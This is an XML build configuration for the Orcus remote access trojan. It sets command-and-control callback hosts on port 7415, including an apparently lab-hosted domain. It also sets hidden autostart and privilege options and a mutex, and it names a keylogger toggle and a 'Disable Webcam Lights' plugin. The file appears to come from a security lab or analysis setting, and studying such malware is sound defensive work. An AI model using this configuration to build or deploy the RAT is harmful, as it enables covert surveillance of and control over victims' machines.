<?xml version="1.0" encoding="utf-8"?>
<BuildConfiguration xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Settings>
    <ClientSetting SettingsType="Orcus.Shared.Settings.AutostartBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>AutostartMethod</Name>
          <Value xsi:type="StartupMethod">Disable</Value>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>TaskSchedulerTaskName</Name>
          <Value xsi:type="xsd:string">Orcus</Value>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>TaskHighestPrivileges</Name>
          <Value xsi:type="xsd:boolean">true</Value>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>RegistryHiddenStart</Name>
          <Value xsi:type="xsd:boolean">true</Value>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>RegistryKeyName</Name>
          <Value xsi:type="xsd:string">Orcus</Value>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>TryAllAutostartMethodsOnFail</Name>
          <Value xsi:type="xsd:boolean">true</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.ChangeAssemblyInformationBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>ChangeAssemblyInformation</Name>
          <Value xsi:type="xsd:boolean">false</Value>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>AssemblyTitle</Name>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>AssemblyDescription</Name>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>AssemblyCompanyName</Name>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>AssemblyProductName</Name>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>AssemblyCopyright</Name>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>AssemblyTrademarks</Name>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>AssemblyProductVersion</Name>
          <Value xsi:type="xsd:string">1.0.0.0</Value>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>AssemblyFileVersion</Name>
          <Value xsi:type="xsd:string">1.0.0.0</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.ChangeCreationDateBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>IsEnabled</Name>
          <Value xsi:type="xsd:boolean">false</Value>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>NewCreationDate</Name>
          <Value xsi:type="xsd:dateTime">2017-06-09T05:56:35</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.ChangeIconBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>ChangeIcon</Name>
          <Value xsi:type="xsd:boolean">false</Value>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>IconPath</Name>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.ClientTagBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>ClientTag</Name>
          <Value xsi:type="xsd:string" />
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.ConnectionBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>IpAddresses</Name>
          <Value xsi:type="ArrayOfIpAddressInfo">
            <IpAddressInfo>
              <Ip>127.0.0.1</Ip>
              <Port>7415</Port>
            </IpAddressInfo>
            <IpAddressInfo>
              <Ip>10.201.46.10</Ip>
              <Port>7415</Port>
            </IpAddressInfo>
            <IpAddressInfo>
              <Ip>lab.kasperskylab.pro</Ip>
              <Port>7415</Port>
            </IpAddressInfo>
          </Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.DataFolderBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>Path</Name>
          <Value xsi:type="xsd:string">%appdata%\Orcus</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.DefaultPrivilegesBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>RequireAdministratorRights</Name>
          <Value xsi:type="xsd:boolean">false</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.DisableInstallationPromptBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>IsDisabled</Name>
          <Value xsi:type="xsd:boolean">false</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.FrameworkVersionBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>FrameworkVersion</Name>
          <Value xsi:type="FrameworkVersion">NET35</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.HideFileBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>HideFile</Name>
          <Value xsi:type="xsd:boolean">false</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.InstallationLocationBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>Path</Name>
          <Value xsi:type="xsd:string">%programfiles%\Orcus\Orcus.exe</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.InstallBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>Install</Name>
          <Value xsi:type="xsd:boolean">false</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.KeyloggerBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>IsEnabled</Name>
          <Value xsi:type="xsd:boolean">false</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.MutexBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>Mutex</Name>
          <Value xsi:type="xsd:string">751851aace4d4b6b9a2ceb9c4c5bb11d</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.ProxyBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>ProxyOption</Name>
          <Value xsi:type="ProxyOption">None</Value>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>ProxyAddress</Name>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>ProxyPort</Name>
          <Value xsi:type="xsd:int">1080</Value>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>ProxyType</Name>
          <Value xsi:type="xsd:int">2</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.ReconnectDelayProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>Delay</Name>
          <Value xsi:type="xsd:int">10000</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.RequireAdministratorPrivilegesInstallerBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>RequireAdministratorPrivileges</Name>
          <Value xsi:type="xsd:boolean">true</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.RespawnTaskBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>IsEnabled</Name>
          <Value xsi:type="xsd:boolean">false</Value>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>TaskName</Name>
          <Value xsi:type="xsd:string">Orcus Respawner</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.ServiceBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>Install</Name>
          <Value xsi:type="xsd:boolean">false</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.SetRunProgramAsAdminFlagBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>SetFlag</Name>
          <Value xsi:type="xsd:boolean">false</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
    <ClientSetting SettingsType="Orcus.Shared.Settings.WatchdogBuilderProperty, Orcus.Shared">
      <Properties>
        <PropertyNameValue>
          <Name>IsEnabled</Name>
          <Value xsi:type="xsd:boolean">false</Value>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>Name</Name>
          <Value xsi:type="xsd:string">OrcusWatchdog.exe</Value>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>WatchdogLocation</Name>
          <Value xsi:type="WatchdogLocation">AppData</Value>
        </PropertyNameValue>
        <PropertyNameValue>
          <Name>PreventFileDeletion</Name>
          <Value xsi:type="xsd:boolean">false</Value>
        </PropertyNameValue>
      </Properties>
    </ClientSetting>
  </Settings>
  <Plugins>
    <BuildConfigurationPlugin>
      <Guid>e6ee5674-bb94-46c7-8bbc-5729af6e2c28</Guid>
      <Name>Disable Webcam Lights</Name>
      <Version>
        <Major>1</Major>
        <Minor>0</Minor>
      </Version>
      <Type>ClientPlugin</Type>
    </BuildConfigurationPlugin>
    <BuildConfigurationPlugin>
      <Guid>6dc8899e-2389-42dd-9893-14ba1c9a85af</Guid>
      <Name>Orcus Patcher</Name>
      <Version>
        <Major>2</Major>
        <Minor>0</Minor>
      </Version>
      <Type>BuildPlugin</Type>
    </BuildConfigurationPlugin>
  </Plugins>
  <Name>Default</Name>
  <CreationDate>2017-06-09T05:58:19.7999912+02:00</CreationDate>
  <LastModified>2017-06-09T05:58:19.7999912+02:00</LastModified>
</BuildConfiguration>